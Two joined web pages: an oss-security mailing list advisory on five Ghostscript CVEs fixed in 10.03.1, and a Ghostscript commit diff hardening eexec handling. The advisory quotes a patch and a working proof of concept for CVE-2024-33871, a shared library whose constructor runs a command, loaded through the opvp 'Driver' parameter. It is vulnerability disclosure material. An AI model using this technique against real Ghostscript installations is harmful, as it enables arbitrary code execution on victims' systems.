=== Content from www.openwall.com_c66bd50c_20250111_133530.html ===


| [Openwall](/) * [Products](/)   + [Openwall GNU/\*/Linux   *server OS*](/Owl/)+ [Linux Kernel Runtime Guard](/lkrg/)+ [John the Ripper   *password cracker*](/john/)         - [Free & Open Source for any platform](/john/)- [in the cloud](/john/cloud/)- [Pro for Linux](/john/pro/linux/)- [Pro for macOS](/john/pro/macosx/)+ [Wordlists   *for password cracking*](/wordlists/)+ [passwdqc   *policy enforcement*](/passwdqc/)             - [Free & Open Source for Unix](/passwdqc/)- [Pro for Windows (Active Directory)](/passwdqc/windows/)+ [yescrypt   *KDF & password hashing*](/yescrypt/)+ [yespower   *Proof-of-Work (PoW)*](/yespower/)+ [crypt\_blowfish   *password hashing*](/crypt/)+ [phpass   *ditto in PHP*](/phpass/)+ [tcb   *better password shadowing*](/tcb/)+ [Pluggable Authentication Modules](/pam/)+ [scanlogd   *port scan detector*](/scanlogd/)+ [popa3d   *tiny POP3 daemon*](/popa3d/)+ [blists   *web interface to mailing lists*](/blists/)+ [msulogin   *single user mode login*](/msulogin/)+ [php\_mt\_seed   *mt\_rand() cracker*](/php_mt_seed/)* [Services](/services/)* Publications       + [Articles](/articles/)+ [Presentations](/presentations/)* Resources         + [Mailing lists](/lists/)+ [Community wiki](https://openwall.info/wiki/)+ [Source code repositories (GitHub)](https://github.com/openwall)+ [Source code repositories (CVSweb)](https://cvsweb.openwall.com)+ [File archive & mirrors](/mirrors/)+ [How to verify digital signatures](/signatures/)+ [OVE IDs](/ove/)* [What's new](/news) | |
| --- | --- |

| | [Hash Suite - Windows password security audit tool. GUI, reports in PDF.](https://hashsuite.openwall.net) | | --- | |
| --- | --- |

[[<prev]](1) [[next>]](3) [[thread-next>]](../../../2024/07/03/7) [[day]](.) [[month]](..) [[year]](../..) [[list]](../../..)
```

Message-ID: <20240628033444.GA521@openwall.com>
Date: Fri, 28 Jun 2024 05:34:45 +0200
From: Solar Designer <solar@...nwall.com>
To: oss-security@...ts.openwall.com
Subject: Ghostscript 10.03.1 (2024-05-02) fixed 5 CVEs including CVE-2024-33871 arbitrary code execution

Hi,

Ghostscript 10.03.1 (2024-05-02) release notes:

<https://ghostscript.readthedocs.io/en/gs10.03.1/News.html>

mentions this:

> - Fixes for CVE-2024-33869, CVE-2023-52722, CVE-2024-33870,
> CVE-2024-33871 and CVE-2024-29510

> - A vulnerability was identified in the way Ghostscript/GhostPDL called
> tesseract for the OCR devices, which could allow arbitrary code
> execution. As as result, we strongly urge anyone including the OCR
> devices in their build to update as soon as possible.

Out of these, CVE-2024-33871 is probably the worst (CVSS 8.8 and
Important per Red Hat):

<https://access.redhat.com/security/cve/CVE-2024-33871>

> A flaw was found in Ghostscript. The "Driver" parameter for the
> "opvp"/"oprp" device specifies the name of a dynamic library and allows
> any library to be loaded. This flaw allows a malicious user to send a
> specially crafted document that, when processed by Ghostscript, could
> potentially lead to arbitrary code execution with the privileges of the
> Ghostscript process on the system.

(recently patched in RHEL 8 and 9, and thus in the RHEL rebuild distros)

There's a patch and a reproducer for it in upstream Bugzilla:

<https://bugs.ghostscript.com/show_bug.cgi?id=707754>

> zhutyra 2024-04-21 15:27:29 UTC
>
> Created attachment 25611 [details]
> patch

+++ a/contrib/opvp/gdevopvp.c
@@ -3456,6 +3456,12 @@ _put_params(gx_device *dev, gs_param_list *plist)
     code = param_read_string(plist, pname, &vdps);
     switch (code) {
     case 0:
+        if (gs_is_path_control_active(dev->memory)
+            && (!opdev->globals.vectorDriver || strlen(opdev->globals.vectorDriver) != vdps.size
+                || memcmp(opdev->globals.vectorDriver, vdps.data, vdps.size) != 0)) {
+            param_signal_error(plist, pname, gs_error_invalidaccess);
+            return_error(gs_error_invalidaccess);
+        }
         buff = realloc(buff, vdps.size + 1);
         memcpy(buff, vdps.data, vdps.size);
         buff[vdps.size] = 0;

> The "Driver" parameter for the "opvp"/"oprp" device specifies the name of a dynamic library and allows any library to be loaded.
>
> The patch does not allow changing this parameter after activating path control.
>
> Comment 1 zhutyra 2024-04-21 15:29:14 UTC
>
> Created attachment 25612 [details]
> exploit
>
> Exploit for x86_64 Linux.
> ```
> $ gs -q -dNODISPLAY opvplib.ps
> uid=1000(user) gid=1000(user) groups=1000(user)
> ```
>
> The file contains a precompiled library. If it doesn't work for you or you don't want to run unknown code, you can also do it manually.
> ```
> $ cat >lib.c <<"EOF"
> #include <stdlib.h>
> static void __attribute__ ((constructor)) init(void) {
>     exit(system("id"));
> }
> EOF
> $ gcc -fPIC -shared -o /tmp/lib.so lib.c
> $ gs -q -dNODISPLAY -c '<< /OutputDevice /opvp /Driver (/tmp/lib.so) >> setpagedevice'
> uid=1000(user) gid=1000(user) groups=1000(user)

The second attachment (exploit) gives me "Sorry, you are not authorized
to access attachment #25612." but apparently it's just a precompiled
version of what's included in the comment body, above, so not required
to exploit the issue.  A colleague has tested the above exploit on
latest CentOS 7 and it just worked (now patched in CIQ's CentOS Bridge).

CVE-2024-33870 is also pretty bad:

<https://access.redhat.com/security/cve/CVE-2024-33870>

> A flaw was found in Ghostscript. When the gp_validate_path_len function
> validates a path, it distinguishes between absolute and relative paths.
> In the case of relative paths, it will check the path with and without
> the current-directory-prefix ("foo" and "./foo"). This does not take
> into account paths with a parent-directory-prefix. Therefore, a path
> like "../../foo" is also tested as "./../../foo" and if the current
> directory "./" is in the permitted paths, it will pass the check, which
> may allow arbitrary file access.

The remaining 3 CVEs are also serious, although they have lower scores.

The CVE records for all four 2024 CVEs above still merely say "reserved
by a CNA", without descriptions.  The 2023 CVE has proper info in it.

Alexander

```

[Powered by blists](https://www.openwall.com/blists/) - [more mailing lists](https://lists.openwall.net)

Please check out the
[Open Source Software Security Wiki](https://oss-security.openwall.org/wiki/), which is counterpart to this
[mailing list](https://oss-security.openwall.org/wiki/mailing-lists/oss-security).

Confused about [mailing lists](/lists/) and their use?
[Read about mailing lists on Wikipedia](https://en.wikipedia.org/wiki/Electronic_mailing_list)
and check out these
[guidelines on proper formatting of your messages](https://www.complang.tuwien.ac.at/anton/mail-news-errors.html).



=== Content from cgit.ghostscript.com_965cfbd8_20250111_133531.html ===


| [cgit logo](/cgi-bin/cgit.cgi/) | [index](/cgi-bin/cgit.cgi/) : [ghostpdl.git](/cgi-bin/cgit.cgi/ghostpdl.git/ "ghostpdl.git") | 7cf36fb5bd BGPrint\_fixes CCAUX-configure OpenJpeg-1.5 PDF\_gstate PJL\_pdfwrite\_config Type3\_PCL alphabits\_fix\_test alphaslay apitest bug699791 bug707828 build\_consolidation chameleon dev-robin device\_subclassing expat-2.6.4\_update filesec fill-stroke3 freetype-2.13.3\_update freetype-2.5.5 ghostpdl-9.03 ghostpdl-9.53.x-ocr-fixes ghostpdl-9.55.0-customer470 ghostpdl-9.55.0-docs ghostpdl-9.56.0\_ttf\_fix ghostpdl-9.56.1 ghostpdl-9.56.1-backport gpdl-shared-device gs-sprintf gs10.0.0 gs10.01.0 gs10.01.1 gs10.01.1\_Bug706761 gs10.01.2 gs10.02.0 gs10.02.1 gs10.03.0 gs10.03.1 gs10.04.0 gs10.04.0\_openjpeg-2.5.2 gs9.24 gs9.26 gs9.27 gs9.27-release\_tests gs9.28-temp-for-testing gs9.50 gs9.51 gs9.52.1 gs9.53.0 gs9.53.x gs9.54.0 gs9.55.0 gs9.56.0 gs9.56.0\_zlib\_1.2.12 gs904 gs905 gs906 gs907 gs908 gs910 gs912 gs914 gs915 gs916 gs917 gs918 gs919 gs920 gs921 gs922 gs923 gs925 gs925\_scanconvfixes gs\_sprintf-apache\_sprintf gs\_strtok-apache\_strtok gse-10.0.0 java-demo libpng-1.6.44\_update libs-update libtiff\_4.5.0 master mooscript nobble-cal nup-endpage opacity\_shape openjpeg-2.2.0-update openjpeg-2.5.2\_update openjpeg-update-20160927 page\_group patt\_trans\_clist pattern\_simplification pdfi pdfi\_alpha1 pdfwrite\_ocr ramfs\_branch rjw-test robin-test-base tiff-4.7.0\_update zlib-1.2.8 |
| --- | --- | --- |
| Ghostscript and GhostPDL | Tor Andersson |

| [summary](/cgi-bin/cgit.cgi/ghostpdl.git/)[refs](/cgi-bin/cgit.cgi/ghostpdl.git/refs/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)[log](/cgi-bin/cgit.cgi/ghostpdl.git/log/)[tree](/cgi-bin/cgit.cgi/ghostpdl.git/tree/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)[commit](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)[diff](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1) | log msg author committer range |
| --- | --- |

**diff options**

|  | |
| --- | --- |
| context: | 12345678910152025303540 |
| space: | includeignore |
| mode: | unifiedssdiffstat only |
|  |  |

| author | Chris Liddell <chris.liddell@artifex.com> | 2023-09-12 10:46:10 +0100 |
| --- | --- | --- |
| committer | Chris Liddell <chris.liddell@artifex.com> | 2023-09-12 10:46:10 +0100 |
| commit | [afd7188f74918cb51b5fb89f52b54eb16e8acfd1](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1) ([patch](/cgi-bin/cgit.cgi/ghostpdl.git/patch/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)) | |
| tree | [29422d21c5e0d19bed414a9d11eeb0366df23134](/cgi-bin/cgit.cgi/ghostpdl.git/tree/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1) | |
| parent | [8f52d32517149a3f46d2cad73a2e42b2f4aad7f3](/cgi-bin/cgit.cgi/ghostpdl.git/commit/?id=8f52d32517149a3f46d2cad73a2e42b2f4aad7f3) ([diff](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1&id2=8f52d32517149a3f46d2cad73a2e42b2f4aad7f3)) | |

In SAFER (default) don't allow eexec seeds other than the Type 1 standard[Diffstat](/cgi-bin/cgit.cgi/ghostpdl.git/diff/?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)

| -rw-r--r-- | [psi/zmisc1.c](/cgi-bin/cgit.cgi/ghostpdl.git/diff/psi/zmisc1.c?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1) | 8 | |  |  |  | | --- | --- | --- | |
| --- | --- | --- | --- | --- | --- | --- |

1 files changed, 8 insertions, 0 deletions

| diff --git a/psi/zmisc1.c b/psi/zmisc1.cindex e5eb46153..5ef4a38fa 100644--- a/[psi/zmisc1.c](/cgi-bin/cgit.cgi/ghostpdl.git/tree/psi/zmisc1.c?id=8f52d32517149a3f46d2cad73a2e42b2f4aad7f3)+++ b/[psi/zmisc1.c](/cgi-bin/cgit.cgi/ghostpdl.git/tree/psi/zmisc1.c?id=afd7188f74918cb51b5fb89f52b54eb16e8acfd1)@@ -94,6 +94,9 @@ zexE(i\_ctx\_t \*i\_ctx\_p)  if (code < 0) return code;+ if (gs\_is\_path\_control\_active(imemory) != 0 && state.cstate != 55665) {+ return\_error(gs\_error\_rangecheck);+ } return filter\_write(i\_ctx\_p, code, &s\_exE\_template, (stream\_state \*)&state, 0); } @@ -132,6 +135,11 @@ zexD(i\_ctx\_t \*i\_ctx\_p) } if (code < 0) return code;++ if (gs\_is\_path\_control\_active(imemory) != 0 && state.cstate != 55665) {+ return\_error(gs\_error\_rangecheck);+ }+ /\* \* If we're reading a .PFB file, let the filter know about it, \* so it can read recklessly to the end of the binary section. |
| --- |

generated by [cgit v1.2.3](https://git.zx2c4.com/cgit/about/) ([git 2.25.1](https://git-scm.com/)) at 2025-01-11 13:35:31 +0000


